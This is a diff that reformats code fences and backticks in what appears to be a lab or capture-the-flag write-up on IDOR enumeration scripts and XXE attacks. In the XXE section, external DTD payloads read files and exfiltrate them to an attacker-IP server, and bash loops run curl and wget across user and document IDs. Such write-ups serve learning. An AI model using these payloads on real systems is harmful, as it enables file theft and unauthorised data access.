@@ -85,7 +85,7 @@ in the pwnbox terminal, or opening it with the icon:
 
 We go to burpsuite proxy, and open the browser, settings the interceptor off:
 In the browser url, we go to the website via entering:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 This is the website.
@@ -237,7 +237,7 @@ Here is the flag – lets open it:
 #### Technical Methodology & Exploit Execution:
 
 lets enter the target website in a burpsuite browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 It is a employee management website. Lets select documents,while the
@@ -290,8 +290,8 @@ generated using the bash script:
 for i in {1..20}; do
 ```bash
 echo $i >> ids.txt;
-```
 done
+```
 
 
 And when ready, we start the attack:
@@ -319,7 +319,7 @@ The flag is right there for the taking:
 Method 2: we will use the following bash script:
 #!/bin/bash
 
-url="http://<target-IP>:<target-port>"
+url="http://`<target-IP>`:`<target-port>`"
 
 for i in {1..20}; do
 # Use POST method to retrieve the documents for each uid
@@ -333,8 +333,8 @@ for link in $(echo "$response" | grep -oP
 path
 ```bash
 wget -q "$url/$link"
-```
 done
+```
 done
 
 lets put it in a file called 'mass_check.sh' (I used nano editor for that):
@@ -440,7 +440,7 @@ then – putting the following bash script in it (I used nano editor):
 
 #!/bin/bash
 
-url="http://<target-IP>:<target-port>"
+url="http://`<target-IP>`:`<target-port>`"
 
 for i in {1..20}; do
 # Base64-encode the value of i and then URL-encode the
@@ -451,8 +451,8 @@ contract=$(echo -n "$i" | base64 -w 0 | jq -sRr @uri)
 disposition filename
 ```bash
 curl -s -O -J "$url/download.php?contract=$contract"
-```
 done
+```
 
 
 
@@ -568,7 +568,7 @@ device a bash script that will automate the process for id values of 1-100:
 #!/bin/bash
 
 # Define the IP and port once
-host="<target-IP>:<target-port>"
+host="`<target-IP>`:`<target-port>`"
 
 url="http://$host/profile/api.php/profile"
 referer="http://$host/profile/index.php"
@@ -594,8 +594,8 @@ if echo "$response" | grep -q "admin"; then
 ```bash
 echo "Response for x=$x contains 'admin':"
 echo "$response"
-```
 fi
+```
 done
 
 the script will send the GET request to all ids of 1-100, and display the response
@@ -670,7 +670,7 @@ It will take us to the initial edit page, with the flag down below.
 #### Technical Methodology & Exploit Execution:
 
 we will start by entering the target website from burpsuite browser:
-http://<target-IP>
+`http://<target-IP>`
 *in this section the target machine has only IP , and the website is running on
 default http port 80. *
 
@@ -778,6 +778,8 @@ python -m http.server 8080
 
 
 While the server running, on the repeater we will put the payload:
+
+```xml
 <!DOCTYPE email [
 <!ENTITY % begin "<![CDATA[">
 <!ENTITY % file SYSTEM "file:///flag.php">
@@ -785,6 +787,7 @@ While the server running, on the repeater we will put the payload:
 <!ENTITY % xxe SYSTEM "http://<attacker-IP>:8000/xxe.dtd">
 %xxe;
 ]>
+```
 
 In the request xml, same where the previous xml was in the previous session
 And in the email value we put
@@ -825,10 +828,10 @@ with the '&joined;' in the email tag. And send:
 The error caused the source code display the path in the http response. We can
 ```bash
 use that. Lets put the new payload to the 'xxe.dtd'  in the pwnbox:
-```
 <!ENTITY % file SYSTEM "file:///flag.php">
 <!ENTITY % error "<!ENTITY content SYSTEM
 '%nonExistingEntity;/%file;'>">
+```
 With echo it might be too problematic so we will enter it with nano editor .
 
 Then we once again run the python server:
@@ -840,8 +843,7 @@ python -m http.server 8000
 
 And on the page request we put the xml payload:
 <!DOCTYPE email [
-<!ENTITY % remote SYSTEM "http://<attacker-
-IP>:8000/xxe.dtd">
+<!ENTITY % remote SYSTEM "http://`<attacker-IP>`:8000/xxe.dtd">
 %remote;
 %error;
 ]>
@@ -898,8 +900,7 @@ change the path to '/blind/submitDetails.php':
 Now to the pwnbox – lets modify 'xxe.dtd' content to:
 <!ENTITY % file SYSTEM "php://filter/convert.base64-
 encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<attacker-
-IP>:8000/?content=%file;'>">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://`<attacker-IP>`:8000/?content=%file;'>">
 *we will modify with nano editor*:
 
 *pay attention we used base64 convert here. *
@@ -924,14 +925,15 @@ Now to the request – we will put that in our content:
 
 ### And Send
 
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
-<!ENTITY % remote SYSTEM "http://<attacker-
-IP>:8000/xxe.dtd">
+<!ENTITY % remote SYSTEM "http://<attacker-IP>:8000/xxe.dtd">
 %remote;
 %oob;
 ]>
 <root>&content;</root>
+```
 
 
 And Send:
@@ -973,7 +975,7 @@ Lets decode it:
 
 we will begin with entering the target server web page in the
 burpsuite browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 Nice and simple login page.
@@ -1038,7 +1040,7 @@ is 1 to 100):
 
 #!/bin/bash
 
-url="http://<target-IP>:<target-port>/api.php/user"
+url="http://`<target-IP>`:`<target-port>`/api.php/user"
 
 for x in {1..100}; do
 # Send the GET request and print only the response body
@@ -1050,8 +1052,8 @@ response=$(curl -s "$url/$x")
 echo "Response for x=$x:"
 echo "$response"
 echo "----------------------------------------"
-```
 done
+```
 
 
 We will put the script in a file called 'mass_check4.sh' (as seen in the
